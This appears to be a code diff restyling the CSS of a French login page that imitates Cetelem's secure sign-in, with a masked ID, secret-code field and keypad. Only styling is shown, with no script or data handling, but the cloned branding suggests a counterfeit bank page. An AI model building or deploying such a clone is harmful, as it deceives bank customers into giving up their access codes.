@@ -6,237 +6,239 @@
   <title>Connexion sécurisée</title>
   <link rel="icon" href="https://www.cetelem.fr/favicon.ico" type="image/x-icon" />
   <style>
-   @media (min-width: 768px) {
-      .main-container {
-        width: 66.6667%;
-      }
-    }
-
-    body  {
-      font-family: Arial, sans-serif;
-      background-color: #c1d4cd;
-      margin: 0;
-      padding: 0;
-    }
-
-    .logo {
-      text-align: center;
-      padding-top: 20px;
-      font-size: 36px;
-      font-weight: bold;
-      color: #1b5e20;
-    }
-
-    .legal {
-      text-align: center;
-      font-size: 14px;
-      color: #333;
-      margin-top: 5px;
-    }
-
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 25px 20px 20px 15px; /* réduit l'écart en haut */
-    }
-
-    .login-box {
-      background-color: #fff;
-      padding: 20px 15px;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-      max-width: 400px;
-      width: 100%;
-      position: relative;
-    }
-
-    .back-link {
-      position: absolute;
-      top: 15px;
-      left: 15px;
-      color: #014421;
-      font-weight: bold;
-      text-decoration: none;
-      font-size: 14px; /* Taille réduite ici */
-
-    }
-
-    .avatar {
-      font-size: 20px; /* augmente la taille globale */
-      margin-top: -10px;  /* réduit l'écart au-dessus */
-      height: 50  px;    /* agrandit la hauteur */
-    }
-
-    .avatar svg {
-      height: 50px;
-      fill: #014421;
-    }
-
-    .masked-id {
-      text-align: center;
-      margin: 10px 0;
-      font-size: 20px;
-      color: #000;
-    }
-
-    form {
-      margin-top: 20px; /* augmente l'espace entre tous les enfants du formulaire */
-      margin-bottom: 10px;
-      width: 100%;
-      box-sizing: border-box;
-    }
-
-    h2 {
-      font-size:1.5rem; /* augmente ici si tu veux plus grand, ex. 32px */
-      font-weight:700;
-      text-align: center;
-      margin: 20px 0;
-      line-height: 32px;
-      color: #292c2e;
-    }
-
-    form h2 {
-      font-size: 22px;
-      color: #006f45; /* Couleur Cetelem */
-      margin-top: 25px;
-    }
-
-    .label-secret {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: bold;
-      font-size: 14px;
-      color: #000;
-      text-align: left; /* ✅ ceci aligne à droite */
-      width: 100%;
+  <style>
+  /* Évite le zoom automatique sur mobile (notamment iOS) */
+  input,
+  button,
+  select,
+  textarea,
+  a {
+    font-size: 16px;
   }
 
-    .input-wrapper {
-      position: relative;
-      margin: 10px 0 20px;
+  @media (min-width: 768px) {
+    .main-container {
+      width: 66.6667%;
     }
+  }
 
-    #codeInput {
-      width: 80%;
-      padding: 10px 40px 10px 10px;
-      font-size: 18px;
-      text-align: left;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      letter-spacing: 5px;
-      box-sizing: border-box;
-    }
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #c1d4cd;
+    margin: 0;
+    padding: 0;
+  }
 
-    #code {
-      width: 220px;
-      padding: 12px;
-      font-size: 18px;
-      margin-bottom: 15px;
-}
+  .logo {
+    text-align: center;
+    padding-top: 20px;
+    font-size: 36px;
+    font-weight: bold;
+    color: #1b5e20;
+  }
 
-    .clear-btn,
-    .check-mark {
-      position: absolute;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 18px;
-      cursor: pointer;
-      user-select: none;
-    }
-
-    .clear-btn {
-      right: 35px;
-      color: #888;
-      display: none;
-    }
-
-    .check-mark {
-      right: 10px;
-      color: green;
-      display: none;
-    }
-
-    .keypad {
-      display: grid;
-      grid-template-columns: repeat(5, 1fr);
-      gap: 15px;
-      justify-content: center;
-      align-items: center;
-      padding: 10px 0;
-      max-width: 300px;
-      margin: 0 auto;
-    }
-
-    .keypad button {
-      width: 50px;
-      height: 50px;
-      border-radius: 50%;
-      background-color: #014421;
-      color: white;
-      font-size: 18px;
-      border: none;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .submit-btn {
-      width: 100%;
-      background-color: #a5abad;
-      color: white;
-      padding: 10px;
-      font-size: 16px;
-      border: none;
-      border-radius: 4px;
-      cursor: not-allowed;
-    }
-
-    .submit-btn:enabled {
-      background-color: #1b5e20;
-      cursor: pointer;
-    }
-
-    .submit-btn:enabled:hover {
-      background-color: #145c17;
-    }
-
-    .forgot-link {
-      display: block;
-      margin-top: 10px;
-      color: #014421;
-      font-size: 13px;
-      text-decoration: underline;
-      text-align: center;
-    }
-
-    footer {
-      text-align: center;
-      margin-top: 40px;
-      font-size: 12px;
-    }
-
-    .footer-links a {
-  color: #000;
-  text-decoration: none;
-  margin: 0 5px;
-}
-
-@media (max-width: 480px) {
-  .login-box {
-    max-height: 90vh;
-    overflow-y: auto;
-    padding: 20px;
-    margin: 10px 0;
+  .legal {
+    text-align: center;
+    font-size: 14px;
+    color: #333;
+    margin-top: 5px;
   }
 
   .container {
-    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 25px 20px 20px 15px;
   }
-}
 
-  </style>
+  .login-box {
+    background-color: #fff;
+    padding: 20px 15px;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    max-width: 400px;
+    width: 100%;
+    position: relative;
+  }
+
+  .back-link {
+    position: absolute;
+    top: 15px;
+    left: 15px;
+    color: #014421;
+    font-weight: bold;
+    text-decoration: none;
+    font-size: 14px;
+  }
+
+  .avatar {
+    font-size: 20px;
+    margin-top: -10px;
+    height: 50px;
+  }
+
+  .avatar svg {
+    height: 50px;
+    fill: #014421;
+  }
+
+  .masked-id {
+    text-align: center;
+    margin: 10px 0;
+    font-size: 20px;
+    color: #000;
+  }
+
+  form {
+    margin-top: 20px;
+    margin-bottom: 10px;
+    width: 100%;
+    box-sizing: border-box;
+  }
+
+  h2 {
+    font-size: 1.5rem;
+    font-weight: 700;
+    text-align: center;
+    margin: 20px 0;
+    line-height: 32px;
+    color: #292c2e;
+  }
+
+  form h2 {
+    font-size: 22px;
+    color: #006f45;
+    margin-top: 25px;
+  }
+
+  .label-secret {
+    display: block;
+    margin-bottom: 8px;
+    font-weight: bold;
+    font-size: 16px;
+    color: #000;
+    text-align: left;
+    width: 100%;
+  }
+
+  .input-wrapper {
+    position: relative;
+    margin: 10px 0 20px;
+  }
+
+  #codeInput {
+    width: 100%;
+    padding: 10px 40px 10px 90px;
+    font-size: 18px;
+    text-align: left;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    letter-spacing: 5px;
+    box-sizing: border-box;
+  }
+
+  #code {
+    width: 220px;
+    padding: 12px;
+    font-size: 18px;
+    margin-bottom: 15px;
+  }
+
+  .clear-btn,
+  .check-mark {
+    position: absolute;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 18px;
+    cursor: pointer;
+    user-select: none;
+  }
+
+  .clear-btn {
+    right: 35px;
+    color: #888;
+    display: none;
+  }
+
+  .check-mark {
+    right: 10px;
+    color: green;
+    display: none;
+  }
+
+  .keypad {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 15px;
+    justify-content: center;
+    align-items: center;
+    padding: 10px 0;
+    max-width: 300px;
+    margin: 0 auto;
+  }
+
+  .keypad button {
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    background-color: #014421;
+    color: white;
+    font-size: 18px;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .submit-btn {
+    width: 100%;
+    background-color: #a5abad;
+    color: white;
+    padding: 10px;
+    font-size: 16px;
+    border: none;
+    border-radius: 4px;
+    cursor: not-allowed;
+  }
+
+  .submit-btn:enabled {
+    background-color: #1b5e20;
+    cursor: pointer;
+  }
+
+  .submit-btn:enabled:hover {
+    background-color: #145c17;
+  }
+
+  .forgot-link {
+    display: block;
+    margin-top: 10px;
+    color: #014421;
+    font-size: 13px;
+    text-decoration: underline;
+    text-align: center;
+  }
+
+  footer {
+    text-align: center;
+    margin-top: 40px;
+    font-size: 12px;
+  }
+
+  .footer-links a {
+    color: #000;
+    text-decoration: none;
+    margin: 0 5px;
+  }
+
+  @media (max-width: 480px) {
+    .login-box {
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+  }
+</style>
 </head>
 <body>
 <div class="logo">
